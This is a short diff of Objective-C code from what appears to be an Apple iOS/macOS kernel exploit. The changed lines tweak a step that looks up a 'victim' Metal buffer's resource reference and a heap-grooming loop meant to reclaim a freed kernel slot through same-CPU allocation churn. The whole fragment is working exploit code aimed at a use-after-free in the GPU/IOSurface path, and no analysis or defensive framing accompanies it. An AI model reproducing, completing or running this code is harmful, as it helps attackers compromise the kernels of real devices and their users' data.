@@ -103,7 +103,7 @@ static NSString *P122Ret(void) {
                                               options:MTLResourceStorageModeShared
                                             deallocator:nil];
     if (!buf) { p122_log(@"[-] bytesNoCopy create failed"); return P122Ret(); }
-    void *res = (void *)[(__bridge NSObject *)buf performSelector:@selector(resourceRef)];
+    void *res = (void *)[buf performSelector:@selector(resourceRef)];
     uint32_t ty = res && g_getType ? g_getType(res) : 0;
     uint32_t conn = res && g_getConn ? g_getConn(res) : 0;
     p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x (0x80 required, 0x82 = IOSurface path)",
@@ -132,8 +132,7 @@ static NSString *P122Ret(void) {
 
     /* 3 — the reclaim churn window: IOSurface-pool create/destroy bursts RIGHT
        NOW (same-CPU law; the freed 0xb0 slot pops from this CPU's magazine) */
-    /* IOSurface churn via the kext dlsym path is the backend's law; here the
-       GPU-pool churning happens via short-lived Metal buffers on this CPU: */
+    NSMutableArray *churn = [NSMutableArray array];
     for (int i = 0; i < 8; i++) {   /* mag cap 8 — same-CPU LIFO pop law */
         vm_address_t cp = 0;
         if (vm_allocate(mach_task_self(), &cp, P122_PAGE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
